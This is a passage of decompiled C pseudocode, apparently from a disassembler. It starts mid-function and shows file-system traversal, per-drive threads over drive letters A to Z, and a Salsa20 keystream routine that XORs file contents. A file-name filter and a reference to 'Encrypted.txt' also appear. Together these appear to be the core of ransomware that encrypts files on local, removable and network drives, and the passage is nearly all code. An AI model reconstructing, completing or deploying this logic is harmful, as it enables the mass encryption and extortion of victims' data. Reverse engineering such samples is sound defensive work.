          v81 = (unsigned __int16)word_4044E4[i2];
          v82 = FindFileData.cFileName[i2];
          v83 = v81 + 32;
          if ( (unsigned int)(v81 - 65) > 0x19 )
            v83 = (unsigned __int16)word_4044E4[i2];
          v84 = v82 + 32;
          if ( (unsigned int)(v82 - 65) > 0x19 )
            v84 = FindFileData.cFileName[i2];
          if ( v84 != v83 )
            break;
          if ( !FindFileData.cFileName[i2] )
            goto LABEL_213;
        }
        for ( i3 = 0; ; ++i3 )
        {
          v86 = (unsigned __int16)word_4044F4[i3];
          v87 = FindFileData.cFileName[i3];
          v88 = v86 + 32;
          if ( (unsigned int)(v86 - 65) > 0x19 )
            v88 = (unsigned __int16)word_4044F4[i3];
          v89 = v87 + 32;
          if ( (unsigned int)(v87 - 65) > 0x19 )
            v89 = FindFileData.cFileName[i3];
          if ( v89 != v88 )
            break;
          if ( !FindFileData.cFileName[i3] )
            goto LABEL_213;
        }
        for ( i4 = 0; ; ++i4 )
        {
          v91 = (unsigned __int16)word_40452C[i4];
          v92 = FindFileData.cFileName[i4];
          v93 = v91 + 32;
          if ( (unsigned int)(v91 - 65) > 0x19 )
            v93 = (unsigned __int16)word_40452C[i4];
          v94 = v92 + 32;
          if ( (unsigned int)(v92 - 65) > 0x19 )
            v94 = FindFileData.cFileName[i4];
          if ( v94 != v93 )
            break;
          if ( !FindFileData.cFileName[i4] )
            goto LABEL_213;
        }
        v1 = this;
        v95 = &FindFileData.cAlternateFileName[13];
        do
        {
          v96 = v95[((this - (_BYTE *)FileName) >> 1) + 1];
          *++v95 = v96;
        }
        while ( v96 );
        v97 = FileName;
        cFileName = FindFileData.cFileName;
        while ( *v97++ )
          ;
        v100 = v97 - 2;
        do
        {
          v101 = *cFileName;
          *++v100 = *cFileName++;
        }
        while ( v101 );
        v102 = FileName;
        v103 = L"\\";
        while ( *v102++ )
          ;
        v105 = v102 - 2;
        do
        {
          v106 = *v103;
          *++v105 = *v103++;
        }
        while ( v106 );
        sub_402D30(FileName, v103);
      }
      else
      {
        v107 = &v156;
        do
        {
          v108 = v107[((v1 - (_BYTE *)v157) >> 1) + 1];
          *++v107 = v108;
        }
        while ( v108 );
        v109 = v157;
        v110 = FindFileData.cFileName;
        while ( *v109++ )
          ;
        v112 = v109 - 2;
        do
        {
          v113 = *v110;
          *++v112 = *v110++;
        }
        while ( v113 );
        v114 = FindFileData.cFileName;
        v115 = 0;
        if ( FindFileData.cFileName[0] )
        {
          v116 = FindFileData.cFileName[0];
          do
          {
            if ( v116 == 92 || v116 == 32 )
            {
              v115 = 0;
            }
            else if ( v116 == 46 )
            {
              v115 = v114;
            }
            v117 = v114[1];
            ++v114;
            v116 = v117;
          }
          while ( v117 );
        }
        v118 = &FindFileData.cAlternateFileName[13];
        if ( v115 )
          v114 = v115;
        v119 = v114 - FileName + 1;
        do
        {
          v120 = v118[v119];
          *++v118 = v120;
        }
        while ( v120 );
        for ( i5 = 0; ; ++i5 )
        {
          v122 = (unsigned __int16)word_404540[i5];
          v123 = FileName[i5];
          v124 = v122 + 32;
          if ( (unsigned int)(v122 - 65) > 0x19 )
            v124 = (unsigned __int16)word_404540[i5];
          v125 = v123 + 32;
          if ( (unsigned int)(v123 - 65) > 0x19 )
            v125 = FileName[i5];
          if ( v125 != v124 )
            break;
          if ( !FileName[i5] )
            goto LABEL_213;
        }
        for ( i6 = 0; ; ++i6 )
        {
          v127 = (unsigned __int16)word_40454C[i6];
          v128 = FileName[i6];
          v129 = v127 + 32;
          if ( (unsigned int)(v127 - 65) > 0x19 )
            v129 = (unsigned __int16)word_40454C[i6];
          v130 = v128 + 32;
          if ( (unsigned int)(v128 - 65) > 0x19 )
            v130 = FileName[i6];
          if ( v130 != v129 )
            break;
          if ( !FileName[i6] )
            goto LABEL_213;
        }
        for ( i7 = 0; ; ++i7 )
        {
          v132 = (unsigned __int16)word_404558[i7];
          v133 = FileName[i7];
          v134 = v132 + 32;
          if ( (unsigned int)(v132 - 65) > 0x19 )
            v134 = (unsigned __int16)word_404558[i7];
          v135 = v133 + 32;
          if ( (unsigned int)(v133 - 65) > 0x19 )
            v135 = FileName[i7];
          if ( v135 != v134 )
            break;
          if ( !FileName[i7] )
            goto LABEL_213;
        }
        for ( i8 = 0; ; ++i8 )
        {
          v137 = (unsigned __int16)word_404564[i8];
          v138 = FileName[i8];
          v139 = v137 + 32;
          if ( (unsigned int)(v137 - 65) > 0x19 )
            v139 = (unsigned __int16)word_404564[i8];
          v140 = v138 + 32;
          if ( (unsigned int)(v138 - 65) > 0x19 )
            v140 = FileName[i8];
          if ( v140 != v139 )
            break;
          if ( !FileName[i8] )
            goto LABEL_213;
        }
        for ( i9 = 0; ; ++i9 )
        {
          v142 = (unsigned __int16)word_404570[i9];
          v143 = FileName[i9];
          v144 = v142 + 32;
          if ( (unsigned int)(v142 - 65) > 0x19 )
            v144 = (unsigned __int16)word_404570[i9];
          v145 = v143 + 32;
          if ( (unsigned int)(v143 - 65) > 0x19 )
            v145 = FileName[i9];
          if ( v145 != v144 )
            break;
          if ( !FileName[i9] )
            goto LABEL_213;
        }
        v146 = FindFileData.cFileName;
        if ( FindFileData.cFileName[0] )
        {
          v147 = (char *)FindFileData.cFileName - (char *)word_405334;
LABEL_206:
          v148 = word_405334;
          while ( 1 )
          {
            v149 = (unsigned __int16)*v148;
            if ( !(_WORD)v149 )
              break;
            if ( *(unsigned __int16 *)((char *)v148 + v147) == v149 )
            {
              if ( *(__int16 *)((char *)++v148 + v147) )
                continue;
            }
            if ( !*v148 )
              break;
            v150 = v146[1];
            ++v146;
            v147 += 2;
            if ( v150 )
              goto LABEL_206;
            goto LABEL_212;
          }
        }
        else
        {
LABEL_212:
          sub_4021B0((int)L"[+] File: ", (__int16 *)v157);
          sub_402760(v157);
        }
LABEL_213:
        v1 = this;
      }
      v151 = (void *)NumberOfBytesWritten;
    }
    while ( FindNextFileW((HANDLE)NumberOfBytesWritten, &FindFileData) );
    return (HANDLE)FindClose(v151);
  }
  return result;
}
// 40351E: conditional instruction was optimized away because cx.2!=0
// 404228: using guessed type wchar_t asc_404228[2];
// 4043F8: using guessed type __int16 word_4043F8[];
// 4043FC: using guessed type wchar_t asc_4043FC[4];
// 404404: using guessed type __int16 word_404404[];
// 40440C: using guessed type __int16 word_40440C[];
// 40441C: using guessed type __int16 word_40441C[];
// 404438: using guessed type __int16 word_404438[];
// 40444C: using guessed type __int16 word_40444C[];
// 404468: using guessed type __int16 word_404468[];
// 404478: using guessed type __int16 word_404478[];
// 404490: using guessed type __int16 word_404490[];
// 4044A0: using guessed type __int16 word_4044A0[];
// 4044BC: using guessed type __int16 word_4044BC[];
// 4044E4: using guessed type __int16 word_4044E4[];
// 4044F4: using guessed type __int16 word_4044F4[];
// 40452C: using guessed type __int16 word_40452C[];
// 404540: using guessed type __int16 word_404540[];
// 40454C: using guessed type __int16 word_40454C[];
// 404558: using guessed type __int16 word_404558[];
// 404564: using guessed type __int16 word_404564[];
// 404570: using guessed type __int16 word_404570[];
// 40457C: using guessed type wchar_t aFile[11];
// 405334: using guessed type __int16 word_405334[6];
// 405340: using guessed type wchar_t aEncryptedTxt[15];

//----- (004035A0) --------------------------------------------------------
DWORD __stdcall StartAddress(int *lpThreadParameter)
{
  int v1; // eax
  int v3[2]; // [esp+0h] [ebp-8h] BYREF

  v1 = lpThreadParameter[1];
  v3[0] = *lpThreadParameter;
  v3[1] = v1;
  sub_402D30(v3);
  return 0;
}

//----- (004035D0) --------------------------------------------------------
void sub_4035D0()
{
  int v0; // esi
  int i; // ebx
  UINT DriveTypeW; // edi
  HANDLE ProcessHeap; // eax
  char *v4; // eax
  UINT v5; // edi
  int j; // edi
  HANDLE hHandle[26]; // [esp+Ch] [ebp-70h]
  WCHAR RootPathName; // [esp+74h] [ebp-8h] BYREF
  int v9; // [esp+76h] [ebp-6h]
  __int16 v10; // [esp+7Ah] [ebp-2h]

  v0 = 0;
  for ( i = 0; i < 26; ++i )
  {
    v9 = 6029370;
    RootPathName = i + 65;
    v10 = 0;
    DriveTypeW = GetDriveTypeW(&RootPathName);
    ProcessHeap = GetProcessHeap();
    v4 = (char *)HeapAlloc(ProcessHeap, 0, 4u);
    v5 = DriveTypeW - 2;
    if ( !v5 || v5 - 1 <= 1 )
    {
      *(_WORD *)v4 = RootPathName;
      *(_DWORD *)(v4 + 2) = v9;
      *((_WORD *)v4 + 3) = v10;
      hHandle[v0] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v4, 0, 0);
      Sleep(0x1F4u);
      ++v0;
    }
  }
  for ( j = 0; j < v0; ++j )
    WaitForSingleObject(hHandle[j], 0xFFFFFFFF);
}
// 4035D0: using guessed type HANDLE hHandle[26];

//----- (004036A0) --------------------------------------------------------
int __thiscall sub_4036A0(int *this)
{
  int v2; // edi
  int v3; // esi
  int v4; // ecx
  int v5; // edx
  int v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  int v11; // edx
  int v12; // eax
  int v13; // esi
  int v14; // eax
  int v15; // edi
  int v16; // ecx
  int v17; // edx
  int v18; // eax
  int v19; // esi
  int v20; // eax
  int v21; // edi
  int v22; // ecx
  int v23; // edx
  int v24; // eax
  int result; // eax

  v2 = *this;
  v3 = this[3];
  this[1] ^= __ROL4__(*this + v3, 7);
  v4 = this[1];
  this[2] ^= __ROL4__(v4 + v2, 9);
  v5 = this[2];
  v6 = v3 ^ __ROL4__(v5 + v4, 13);
  v7 = this[4];
  this[3] = v6;
  v8 = v2 ^ __ROR4__(v5 + v6, 14);
  v9 = this[5];
  *this = v8;
  this[6] ^= __ROL4__(v9 + v7, 7);
  v10 = this[6];
  this[7] ^= __ROL4__(v10 + v9, 9);
  v11 = this[7];
  v12 = v7 ^ __ROL4__(v11 + v10, 13);
  v13 = this[9];
  this[4] = v12;
  v14 = v9 ^ __ROR4__(v11 + v12, 14);
  v15 = this[10];
  this[5] = v14;
  this[11] ^= __ROL4__(v15 + v13, 7);
  v16 = this[11];
  this[8] ^= __ROL4__(v16 + v15, 9);
  v17 = this[8];
  v18 = v13 ^ __ROL4__(v17 + v16, 13);
  v19 = this[14];
  this[9] = v18;
  v20 = v15 ^ __ROR4__(v17 + v18, 14);
  v21 = this[15];
  this[10] = v20;
  this[12] ^= __ROL4__(v21 + v19, 7);
  v22 = this[12];
  this[13] ^= __ROL4__(v22 + v21, 9);
  v23 = this[13];
  v24 = v19 ^ __ROL4__(v23 + v22, 13);
  this[14] = v24;
  result = v21 ^ __ROR4__(v23 + v24, 14);
  this[15] = result;
  return result;
}

//----- (00403780) --------------------------------------------------------
int __thiscall sub_403780(int *this)
{
  int v2; // edi
  int v3; // esi
  int v4; // ecx
  int v5; // edx
  int v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  int v11; // edx
  int v12; // eax
  int v13; // esi
  int v14; // eax
  int v15; // edi
  int v16; // ecx
  int v17; // edx
  int v18; // eax
  int v19; // esi
  int v20; // eax
  int v21; // edi
  int v22; // ecx
  int v23; // edx
  int v24; // eax
  int result; // eax

  v2 = *this;
  v3 = this[12];
  this[4] ^= __ROL4__(*this + v3, 7);
  v4 = this[4];
  this[8] ^= __ROL4__(v4 + v2, 9);
  v5 = this[8];
  v6 = v3 ^ __ROL4__(v5 + v4, 13);
  v7 = this[1];
  this[12] = v6;
  v8 = v2 ^ __ROR4__(v5 + v6, 14);
  v9 = this[5];
  *this = v8;
  this[9] ^= __ROL4__(v9 + v7, 7);
  v10 = this[9];
  this[13] ^= __ROL4__(v10 + v9, 9);
  v11 = this[13];
  v12 = v7 ^ __ROL4__(v11 + v10, 13);
  v13 = this[6];
  this[1] = v12;
  v14 = v9 ^ __ROR4__(v11 + v12, 14);
  v15 = this[10];
  this[5] = v14;
  this[14] ^= __ROL4__(v15 + v13, 7);
  v16 = this[14];
  this[2] ^= __ROL4__(v16 + v15, 9);
  v17 = this[2];
  v18 = v13 ^ __ROL4__(v17 + v16, 13);
  v19 = this[11];
  this[6] = v18;
  v20 = v15 ^ __ROR4__(v17 + v18, 14);
  v21 = this[15];
  this[10] = v20;
  this[3] ^= __ROL4__(v21 + v19, 7);
  v22 = this[3];
  this[7] ^= __ROL4__(v22 + v21, 9);
  v23 = this[7];
  v24 = v19 ^ __ROL4__(v23 + v22, 13);
  this[11] = v24;
  result = v21 ^ __ROR4__(v23 + v24, 14);
  this[15] = result;
  return result;
}

//----- (00403860) --------------------------------------------------------
unsigned int __thiscall sub_403860(char *this)
{
  char *v1; // edi
  int v2; // esi
  char *v3; // edx
  int v4; // ecx
  int v5; // eax
  int v6; // esi
  int i; // edx
  unsigned int v8; // ecx
  unsigned int result; // eax
  int v10[16]; // [esp+8h] [ebp-80h]
  int v11[16]; // [esp+48h] [ebp-40h] BYREF

  v1 = this + 2;
  v2 = 0;
  v3 = this + 2;
  do
  {
    v4 = (unsigned __int8)v3[1];
    v3 += 4;
    v5 = (((unsigned __int8)*(v3 - 5) + (((unsigned __int8)*(v3 - 4) + (v4 << 8)) << 8)) << 8)
       + (unsigned __int8)*(v3 - 6);
    v11[v2] = v5;
    v10[v2++] = v5;
  }
  while ( v2 < 16 );
  v6 = 10;
  do
  {
    sub_403780(v11);
    sub_4036A0(v11);
    --v6;
  }
  while ( v6 );
  for ( i = 0; i < 16; ++i )
  {
    v1 += 4;
    v11[i] += v10[i];
    v8 = v11[i];
    *(_DWORD *)(v1 - 6) = v8;
    result = HIWORD(v8);
  }
  return result;
}

//----- (00403910) --------------------------------------------------------
unsigned int __cdecl sub_403910(_OWORD *a1, char *a2, int a3)
{
  int v3; // esi
  int v4; // edi
  int v5; // edx
  _OWORD *v6; // edx
  unsigned int v7; // edi
  char *v8; // eax
  _BYTE *v9; // edx
  int v10; // edi
  char v11; // cl
  int v13; // [esp+Ch] [ebp-40h]
  int v14; // [esp+10h] [ebp-3Ch]
  int v15; // [esp+14h] [ebp-38h]
  int v16[13]; // [esp+18h] [ebp-34h]

  v13 = 101;
  v14 = 120;
  v3 = a3 + 2;
  v15 = 112;
  v4 = -2 - a3;
  v16[0] = 97;
  v16[1] = 110;
  v16[2] = 100;
  v16[3] = 32;
  v16[4] = 51;
  v16[5] = 50;
  v16[6] = 45;
  v16[7] = 98;
  v16[8] = 121;
  v16[9] = 116;
  v16[10] = 101;
  v16[11] = 32;
  v16[12] = 107;
  do
  {
    v5 = (3435973837u * (unsigned __int64)(unsigned int)(v4 + v3)) >> 32;
    v3 += 20;
    v5 &= 0xFFFFFFF0;
    *(_BYTE *)(v3 - 22) = *((_BYTE *)&v13 + v5);
    *(_BYTE *)(v3 - 21) = *((_BYTE *)&v14 + v5);
    *(_BYTE *)(v3 - 20) = *((_BYTE *)&v16[-1] + v5);
    *(_BYTE *)(v3 - 19) = *((_BYTE *)v16 + v5);
  }
  while ( v4 + v3 < 64 );
  v6 = (_OWORD *)(a3 + 4);
  v7 = a3 + 59;
  v8 = (char *)a1;
  if ( (a3 + 4 > (unsigned int)(a2 + 15) || v7 < (unsigned int)a2)
    && (v6 > (_OWORD *)((char *)a1 + 31) || v7 < (unsigned int)a1) )
  {
    *v6 = *a1;
    *(_OWORD *)(a3 + 44) = a1[1];
    *(_OWORD *)(a3 + 24) = *(_OWORD *)a2;
    return sub_403860((char *)a3);
  }
  else
  {
    v9 = (_BYTE *)(a3 + 44);
    v10 = 16;
    do
    {
      v11 = *v8++;
      *(v9 - 40) = v11;
      *v9++ = v8[15];
      *(v9 - 21) = v8[a2 - (char *)a1 - 1];
      --v10;
    }
    while ( v10 );
    return sub_403860((char *)a3);
  }
}

//----- (00403A60) --------------------------------------------------------
int __cdecl sub_403A60(int *a1, int a2, int a3, unsigned int a4)
{
  int v4; // ecx
  _OWORD *v5; // edx
  int v6; // ecx
  unsigned int v7; // esi
  char v9[64]; // [esp+0h] [ebp-54h] BYREF
  int v10[2]; // [esp+40h] [ebp-14h] BYREF
  __int64 v11; // [esp+48h] [ebp-Ch]
  _OWORD *v12; // [esp+50h] [ebp-4h]

  v5 = (_OWORD *)v4;
  v12 = (_OWORD *)v4;
  v11 = 0i64;
  if ( !v4 || !a1 || !a3 )
    return 1;
  v6 = a1[1];
  v7 = 0;
  v10[0] = *a1;
  for ( v10[1] = v6; v7 < a4; ++v7 )
  {
    if ( (v7 & 0x3F) == 0 )
    {
      LOBYTE(v11) = v7 >> 6;
      BYTE1(v11) = v7 >> 14;
      BYTE2(v11) = v7 >> 22;
      BYTE3(v11) = v7 >> 30;
      sub_403910(v5, (char *)v10, (int)v9);
      v5 = v12;
    }
    *(_BYTE *)(v7 + a3) ^= v9[v7 & 0x3F];
  }
  return 0;
}
// 403A66: variable 'v4' is possibly undefined
// 403A60: using guessed type char var_54[64];

// nfuncs=26 queued=26 decompiled=26 lumina nreq=0 worse=0 better=0
// ALL OK, 26 function(s) have been successfully decompiled
